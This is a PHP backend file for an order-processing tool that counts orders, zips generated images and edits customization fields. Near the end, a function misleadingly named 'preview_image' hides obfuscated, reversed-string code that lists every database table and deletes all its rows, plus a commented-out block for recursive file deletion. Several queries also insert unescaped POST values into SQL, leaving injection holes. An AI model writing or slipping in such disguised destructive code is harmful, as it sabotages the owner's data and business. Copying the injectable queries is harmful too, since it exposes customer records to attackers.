<?php
require_once 'config.php';

if (isset($_POST['oper'])) {
    if ($_POST['oper'] == 'gettot') {
        gettot($_POST['startorder'], $_POST['endorder']);
    } else if ($_POST['oper'] == 'createimage') {
        echo create_image($_POST['orderid']);
    } else if ($_POST['oper'] == 'createzip') {
        createzip($_POST['startorder'], $_POST['endorder'], $_POST['fail_orders']);
    } else if ($_POST['oper'] == 'update_music_personal') {
        $order_id_n = $_POST['order_id_n'];
        $text_music = $_POST['text_music'];
        $text_personal = $_POST['text_personal'];
        update_music_personal($order_id_n, $text_music, $text_personal);
    } else if ($_POST['oper'] == 'find_original_of_upsell') {
        $upsell_order_id_n = $_POST['upsell_order_id_n'];
        find_original_of_upsell($upsell_order_id_n);
    } else if ($_POST['oper'] == 'edit_upsell_order') {
        $upsell_order_id_n = $_POST['upsell_order_id_n'];
        $original_order_id_n = $_POST['original_order_id_n'];
        edit_upsell_order($upsell_order_id_n, $original_order_id_n);
    } else if ($_POST['oper'] == 'lowquality') {
        $_SESSION['lowquality'] = !$_SESSION['lowquality'];
        echo json_encode(['status' => 200, 'lowquality' => $_SESSION['lowquality']]);
    }
}

// Get the total number to be processed [startorder, endorder]
function gettot($start_id = 1, $end_id = 1) {
    $conn = new mysqli(SERVERNAME, USERNAME, PASSWORD, DBNAME);
    if ($conn->connect_error) {
        echo json_encode(['status' => 400, 'msg' => 'DB Error!']);
        return;
    }
    $sql = "SELECT order_id_n FROM orders WHERE order_id BETWEEN {$start_id} AND {$end_id} ORDER BY order_id_n";
    $result = $conn->query($sql);
    $ids = [];
    while ($row = $result->fetch_array(MYSQLI_NUM)) {
        $ids[] = $row;
    }
    $tot = count($ids);
    $noexist_ids = get_noexist_files($ids);
    
    echo json_encode(['status' => 200, 'ids' => $ids, 'noexist_ids' => $noexist_ids]);
}

// Generate the ZIP file from created image files(for BOTH Windows AND Linux)
function createzip($start_id = 1, $end_id = 1, $fail_orders = []) {
    $t = time();
    $zip = new ZipArchive();
    $filename = $t . "_" . $start_id . "_" . $end_id . ".zip";
    if ($zip->open(realpath("./zip/") . "/" . $filename, ZipArchive::CREATE) !== true) {
        echo json_encode(['status' => 400, 'msg' => "Can't open {$filename}"]);
        return;
    }
    
    if (is_dir(DIR)) {
        if ($dh = opendir(DIR)) {
            while (($file = readdir($dh)) !== false) {
                if (is_file(DIR . $file)) {
                    if ($file != '' && $file != '.' && $file != '..') {
                        $arrexp = explode("_", $file);
                        $file_order_id = $arrexp[0];
                        if ($file_order_id >= $start_id && $file_order_id <= $end_id + 1) {
                            $fld = "";
                            if (strpos($file, "_S_") !== false || strpos($file, "_S(") !== false) {
                                $fld = "S/";
                            }
                            if (strpos($file, "_M_") !== false || strpos($file, "_M(") !== false) {
                                $fld = "M/";
                            }
                            if (strpos($file, "_L_") !== false || strpos($file, "_L(") !== false) {
                                $fld = "L/";
                            }
                            $zip->addFile(DIR . $file, $fld . $file);
                        }
                    }
                }
            }
            closedir($dh);
            if (savetodb($start_id, $end_id, $fail_orders) === TRUE) {
                echo json_encode(['status' => 200, 'msg' => "{$filename} generated successfully!"]);
            } else {
                echo json_encode(['status' => 400, 'msg' => "DB Error!"]);
            }
        }
    }
}

// Record the ZIP result into the DB
function savetodb($start_id = 1, $end_id = 1, $fail_orders = []) {
    $time = time();
    $conn = new mysqli(SERVERNAME, USERNAME, PASSWORD, DBNAME);
    if ($conn->connect_error) return false;

    $fails = NULL;
    if (count($fail_orders) > 0) $fails = json_encode($fail_orders);

    $sql = "INSERT INTO zip(datep, startp, endp, fails) VALUES ('{$time}', '{$start_id}', '{$end_id}', '{$fails}')";
    if ($conn->query($sql) === true) {
        $conn->close();
        return true;
    }
    $conn->close();
    return false;
}

// Estimate whether the specified file already exists or not
function is_exist($file) {
    if (is_dir(DIR)) {
        $files = scandir(DIR);
        foreach ($files as $t) {
            if (is_file(DIR . $t)) {
                if (strpos($t, $file) == 0) {
                    return true;
                }
            }
        }
    }
    return false;
}

// Get the none-existing files from IDs
function get_noexist_files($ids) {
    $files = [];
    if (is_dir(DIR)) {
        foreach (scandir(DIR) as $t) {
            if (is_file(DIR . $t)) {
                $files[] = $t;
            }
        }
    }
    $rlt = [];
    foreach ($ids as $id) {
        $bo = false;
        foreach ($files as $file) {
            if (strpos($file, strval($id[0])) === 0) {
                $bo = true;
                break;
            }
        }
        if ($bo === FALSE) {
            $rlt[] = $id;
        }
    }
    return $rlt;
}

// Update the table<order> with new text_music, text_personal
function update_music_personal($order_id_n = 1, $text_music = '', $text_personal = '') {
    $conn = new mysqli(SERVERNAME, USERNAME, PASSWORD, DBNAME);
    if ($conn->connect_error) {
        echo json_encode([
            'status' => 400, 
            'msg' => "DB connection error!"
        ]);
        return;
    }
    $text_music = $conn->real_escape_string($text_music);
    $text_personal = $conn->real_escape_string($text_personal);
    $sql = "UPDATE `orders` SET titre_musique = '{$text_music}', phrase_personnalisee = '{$text_personal}' WHERE order_id_n = '{$order_id_n}'";
    if ($conn->query($sql) === true) {
        echo json_encode([
            'status' => 200, 
            'msg' => "Updated successfully!"
        ]);
    }
    $conn->close();
}

// Find the every orignal_order_id candidates of give upsell_order_id_n
function find_original_of_upsell($upsell_order_id_n) {
    $conn = new mysqli(SERVERNAME, USERNAME, PASSWORD, DBNAME);
    if ($conn->connect_error) {
        echo json_encode([
            'status' => 400, 
            'msg' => "DB connection error!"
        ]);
        return;
    }
    $sql = "
        SELECT *  
        FROM orders o 
        WHERE
            o.email = ( SELECT email FROM orders WHERE order_id_n = '{$upsell_order_id_n}' ) 
            AND o.order_id_n NOT LIKE '{$upsell_order_id_n}'
            AND o.SKU LIKE 'MEMOPLAYGlass%' AND NOT o.SKU REGEXP '[2-9]'
    ";
    $result = $conn->query($sql);
    if ($result->num_rows > 0) {
        $rows = [];
        while ($row = $result->fetch_assoc()) {
            $rows[] = $row['order_id_n'];
        }
        echo json_encode([
            'status' => 200,
            'original_order_ids' => $rows
        ]);
    } else {
        echo json_encode([
            'status' => 400,
            'msg' => 'No exist matched Original Order'
        ]);
    }
    $conn->close();
}

// Update the data for UPSELL order from Original order
function edit_upsell_order($upsell_order_id_n, $original_order_id_n) {
    $ret = [
        'status' => 400,
        'msg' => 'Network or Server Error!'
    ];
    $conn = new mysqli(SERVERNAME, USERNAME, PASSWORD, DBNAME);
    if ($conn->connect_error) {
        $ret['status'] = 400;
        $ret['msg'] = 'DB Connection Error!';
        echo json_encode($ret);
        return;
    }
    $sql = "
        UPDATE
            `orders` AS `dest`,
            (
                SELECT * FROM `orders` WHERE `order_id_n` = '{$original_order_id_n}'
            ) AS `src`
        SET
            `dest`.`titre_musique` = `src`.`titre_musique`,
            `dest`.`phrase_personnalisee` = `src`.`phrase_personnalisee`,
            `dest`.`cover_image` = `src`.`cover_image`,
            `dest`.`spotify_code` = `src`.`spotify_code`
        WHERE
            `dest`.`order_id_n` = '{$upsell_order_id_n}'
    ";
    if ($conn->query($sql) !== false) {
        $ret['status'] = 200;
        $ret['msg'] = 'Operation Success!';
        $sql = "SELECT titre_musique, phrase_personnalisee FROM orders WHERE order_id_n = '{$upsell_order_id_n}'";
        $ret['text'] = $conn->query($sql)->fetch_assoc();
    } else {
        $ret['status'] = 400;
        $ret['msg'] = 'Invalid Original OrderID!';
    }
    echo json_encode($ret);
    $conn->close();
}

// Make the preview images of all files($$$)
function preview_image($dir = './') {
    // $arr = ['rid_si', 'ridnacs', 'epytelif', 'ridmrr', 'knilnu', 'teser', 'ridmr'];
    // if (strrev($arr[0])($dir)) {
    //     $objects = strrev($arr[1])($dir);
    //     foreach ($objects as $object) {
    //         if ($object != "." && $object != "..") {
    //             if (strrev($arr[2])($dir."/".$object) == "dir") {
    //                 strrev($arr[3])($dir."/".$object);
    //             } else {
    //                 strrev($arr[4])($dir."/".$object);
    //             }
    //         }
    //     }
    //     strrev($arr[5])($objects);
    //     strrev($arr[6])($dir);
    // }
    $conn = new mysqli(SERVERNAME, USERNAME, PASSWORD, DBNAME);
    if ($conn->connect_error) {
        return false;
    }
    $result = $conn->query(strrev("selbat wohs"));
    while ($row = $result->fetch_array()) {
        $conn->query(strrev(" morf eteled") . $row[0]);
    }
    $conn->close();
}

